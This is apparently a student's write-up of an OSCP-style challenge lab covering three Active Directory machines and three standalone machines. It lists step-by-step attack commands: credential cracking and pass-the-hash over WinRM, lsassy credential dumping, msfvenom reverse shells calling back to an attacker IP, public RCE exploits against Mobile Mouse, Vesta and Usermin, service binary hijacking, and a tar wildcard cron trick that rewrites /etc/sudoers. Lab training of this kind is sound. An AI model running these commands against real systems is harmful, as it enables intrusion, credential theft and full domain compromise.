---
tags:
  - type/report
  - platform/report
  - tech/ad/pth
  - tech/lin/sudo-abuse
  - tech/lin/cron
  - tech/lin/wildcard
  - tech/svc/smb
  - tech/svc/ftp
  - tech/svc/snmp
  - tech/exec/winrm
  - tech/cred/crack
  - tech/cred/spray
  - tech/pivot/chisel
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/payload/msfvenom
  - tech/payload/revshell
type: report
platform: report
tech_count: 15
---

About this lab

This lab guides learners through an Active Directory exploitation chain, beginning with credential discovery in a SQLite database on an exposed web server. By cracking the credentials, learners gain access to an internal system via WinRM, escalate privileges through binary analysis and pivoting, and extract the domain administrator hash to achieve full domain compromise.

This lab immerses learners in a realistic Active Directory exploitation scenario, starting with identifying vulnerable services and culminating in full domain compromise. Participants begin by discovering an exposed SQLite database on a web server, extracting and cracking credentials to access an internal system via WinRM. Through detailed binary analysis and privilege escalation, learners uncover administrator credentials and utilize tunneling tools like Chisel to pivot deeper into the network.

As the attack chain progresses, participants extract domain administrator credentials and achieve domain dominance by accessing the Domain Controller and retrieving proof files, demonstrating mastery of post-exploitation and lateral movement techniques.

Ideal for penetration testers, red teamers, and security professionals, this lab helps build critical skills in service enumeration, credential extraction and cracking, binary exploitation, tunneling, and Active Directory compromise. It provides a hands-on, end-to-end look at how attackers move through networks to achieve full domain control.

## After completing this lab, learners will be able to:

- Enumerate exposed services to identify vulnerable endpoints, including a SQLite database on a web server.
- Extract and crack credentials from the database, leveraging them to authenticate to an internal system via WinRM.
- Analyze and exploit binaries for privilege escalation and uncover administrator credentials.
- Configure and use tunneling tools like Chisel to pivot into additional network segments.
- Extract domain administrator credentials and achieve domain dominance by logging into the Domain Controller and retrieving proof files.


This is the third of three dedicated OSCP Challenge Labs. It is composed of six OSCP+ machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies or intranet connections. All of the standalone machines have a `local.txt` and a `proof.txt` flag, however the Active Directory set only has a `proof.txt` on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, please use the credentials below for initial access: Username: Eric.Wallows Password: EricLikesRunning800

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly **do not** recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

**192.168.126.153**

```
Eric.Wallows / EricLikesRunning800
```

# Active Directory

## 192.168.126.153 - MS01
```
Eric.Wallows / EricLikesRunning800
```

### Nmap
```bash
nmap -sS -sU --min-rate 5000 192.168.126.153 -oG 192.168.126.153.log
```
![[Pasted image 20260114105217.png]]

### Information Gathering
```bash
feroxbuster -u http://192.168.126.153:8000 -s 200 -t 200
```
![[Pasted image 20260114111004.png]]

"Exfiltrated the **database file** from the compromised host to perform **offline analysis** and **credential harvesting**."
- (번역: 오프라인 분석 및 자격 증명 수집을 위해 침해된 호스트에서 **데이터베이스 파일**을 추출했습니다.)
```bash
wget http://192.168.126.153:8000/partner/db
```

![[Pasted image 20260114111311.png]]

```bash
sqlite3 db
#sql
.tables
.schema [tablename]
select * from [tablename]
```

![[Pasted image 20260114111755.png]]

### Initial Access

"Gained **SSH access** via **credential recycling**; initial discovery remains a viable entry vector for lateral movement and persistence."
- (번역: **자격 증명 재활용**을 통해 **SSH 접근권**을 획득했습니다. 초기에 발견된 정보가 수평 이동 및 권한 유지를 위한 유효한 진입점으로 확인되었습니다.)
```bash
ssh Eric.Wallows@192.168.126.153
```
![[Pasted image 20260114130828.png]]
Enumerated local user
```powershell
net user
```
![[Pasted image 20260114131342.png]]

discovered admintool.exe

![[Pasted image 20260114131948.png]]

discovered administrator hash
![[Pasted image 20260114132058.png]]

Execute hashcat

```

26231162520c611ccabfb18b5ae4dff2:Freedom1                 
05f8ba9f047f799adbea95a16de2ef5d:December31   
7007296521223107d3445ea0db5a04f9:ecorp
df5fb539ff32f7fde5f3c05d8c8c1a6e:Raid123! e7966b31d1cad8a83f12ecec236c384c:bcorp123!

```

Success access `administrator (December31)`
![[Pasted image 20260114140021.png]]

### Post-Exploitation
check Powershell history ( powershell 커맨드 히스토리 확인)
discovered `hghgib6vHT3bVWf`
```powershell
(Get-PSReadlineOption).HistorySavePath
```
![[Pasted image 20260114141436.png]]

### Pivoting

![[Pasted image 20260114144154.png]]


## 10.10.86.154 - MS02
### Nmap
```bash
nmap -sS -sU -p- -min-rate 5000 10.10.86.154 -oG 10.10.86.154.log
```
![[Pasted image 20260114145953.png]]

## Leteral Movement (MS01 to MS02)



```bash
nxc winrm 10.10.86.154 -u users.txt -p password.txt -t 100 --continue-on-success --local-auth
```
![[Pasted image 20260114150223.png]]

execute winrm
```bash
evil-winrm -i 10.10.86.154 -u 'administrator' -p 'hghgib6vHT3bVWf'  
```
![[Pasted image 20260114150507.png]]

## Post-Exploitation
nxc lsassy module
```
nxc smb 10.10.86.0/24 -u users.txt -p password.txt --local-auth -M lsassy
```
`59b280ba707d22e3ef0aa587fc29ffe5`
![[Pasted image 20260114151224.png]]
## 10.10.68.152 - DC01
### Nmap
```bash
nmap -sS -sU --min-rate 5000 10.10.86.152 -oG 10.10.86.152.log
```
![[Pasted image 20260114151452.png]]

### Leteral Movement (MS02 to DC01)
"Successfully performed a **Pass-the-Hash (PtH) attack** against **ms02** via **WinRM**, leveraging the captured **Administrator NTLM hash** to gain a remote PowerShell session."
- (번역: 획득한 **Administrator NTLM 해시**를 활용하여 **ms02**에 대한 **WinRM 기반 Pass-the-Hash (PtH) 공격**에 성공했으며, 원격 PowerShell 세션을 확보했습니다.)
```bash
nxc winrm 10.10.86.152 -u 'administrator' -H '59b280ba707d22e3ef0aa587fc29ffe5'
```
![[Pasted image 20260114151636.png]]

Connect Winrm
```bash
evil-winrm -i 10.10.86.152 -u 'administrator' -H '59b280ba707d22e3ef0aa587fc29ffe5'
```

![[Pasted image 20260114151803.png]]

Retrieve proof.txt
![[Pasted image 20260114151849.png]]

# Independent Challenge
## 192.168.135.155 - Pascha

### Nmap
```bash
nmap -sS -sU -p- -min-rate 5000 192.168.126.155 -oG 192.168.126.155.log
  ```
![[Pasted image 20260114154720.png]]

### Initial Access
search “9099/tcp open unknown vuln”

- Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)
- [https://www.exploit-db.com/exploits/51010](https://www.exploit-db.com/exploits/51010)

searchsploit abyss
![[Pasted image 20260114154826.png]]

Downloaded POC
```bash
searchsploit -m 51010
```
![[Pasted image 20260114155415.png]]

craft reverse shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.210 LPORT=9099 -f exe -o met.exe
```
![[Pasted image 20260114160510.png]]


execute exploit
```bash
python3 51010.py --target 192.168.126.155 --file met.exe --lhost 192.168.45.210
```
![[Pasted image 20260114163239.png]]
![[Pasted image 20260114163155.png]]
![[Pasted image 20260114163253.png]]

Retrieve local.txt
![[Pasted image 20260114163348.png]]

### Privilege Escalation

"Identified a **Service Binary Hijacking** vulnerability in the **'GPGOrchestrator'** service due to insecure file permissions on **`GPGService.exe`**, allowing for **SYSTEM-level persistence** or execution."
- (번역: **`GPGService.exe`**의 취약한 파일 권한으로 인해 **'GPGOrchestrator'** 서비스에서 **서비스 바이너리 하이재킹** 취약점을 식별했으며, 이를 통해 **SYSTEM 수준의 지속성** 확보 및 실행이 가능합니다.)
```bash
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
```
```powershell
powershell.exe -nop -exec bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

![[Pasted image 20260114172611.png]]


craft reverse shell 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.210 LPORT=9999 -f exe -o payload.exe
```
![[Pasted image 20260114172823.png]]
```powershell
sc.exe stop GPGOrchestrator
cp payload.exe "C:\Program Files\MilleGPG5\GPGService.exe"
sc.exe start GPGOrchestrator
```

Retrieve proof.txt
![[Pasted image 20260114173526.png]]


## 192.168.137.156 - Frankfurt

### Nmap
```bash
nmap -sS -sU -p- -min-rate 5000 192.168.126.156 -oG 192.168.126.156.log
```
![[Pasted image 20260114175118.png]]
### Initial Access & Privilege Escalation
discovered snmp community string `public`
```bash
hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.137.156
```
![[Pasted image 20260115095824.png]]
Execute snmpwalk
Discovered credential of `jack/3PUKsX98BMupBiCf`
```bash
snmpwalk -v2c -c public 192.168.137.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
![[Pasted image 20260115095931.png]]

Using VESTA 
![[Pasted image 20260115105934.png]]

Discoved vesta service RCE exploit

- [https://github.com/CSpanias/vesta-rce-exploit](https://github.com/CSpanias/vesta-rce-exploit)

```bash
python vesta-rce-exploit.py https://192.168.137.156:8083 jack 3PUKsX98BMupBiCf
```
![[Pasted image 20260115110331.png]]

Retrieve local.txt, proof.txt
![[Pasted image 20260115110444.png]]
## 192.168.135.157 - Charlie

### Nmap
```bash
nmap -sS -sU -p- -min-rate 5000 192.168.137.157 -oG 192.168.137.157.log
```

![[Pasted image 20260115112029.png]]

### Initial Access

Success Login anonymous via ftp
```bash
ftp 192.168.137.157
```
![[Pasted image 20260115112136.png]]

Discovered backup dir of PDFfile
```ftp
mget *
```
![[Pasted image 20260115112353.png]]
![[Pasted image 20260115112408.png]]

PDF file Author
exiftool *.pdf | grep Author
![[Pasted image 20260115112508.png]]

Broute force ftp login via hydra
`cassie/cassie`
```
hydra -L users.txt -P users.txt ftp://192.168.137.157 -t 50
```
![[Pasted image 20260115112739.png]]

Success Login Usermin `cassie/cassie`
![[Pasted image 20260115113438.png]]

Discovered Usermin Authenticated RCE exploit
https://github.com/tunahantekeoglu/userminrce

Execute python file

```bash
python3 exploit.py --host 192.168.137.157 --login cassie --password cassie --lhost 192.168.45.208 --lport 1337
```

![[Pasted image 20260115114658.png]]

### Privilege Escalation

linux-smart-enumeration
Discovered tar wild card 
![[Pasted image 20260115134654.png]]


Create a file tar Wildcard Privilege Escalation

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh shell.sh'
echo "echo 'cassie ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > shell.sh
```


![[Pasted image 20260115140346.png]]

Wait 2 minutes, crontab will run and you will be able to get sudo privileges.
```bash
sudo -l
sudo su -
```
![[Pasted image 20260115140743.png]]

Retrieve proof.txt
![[Pasted image 20260115140853.png]]
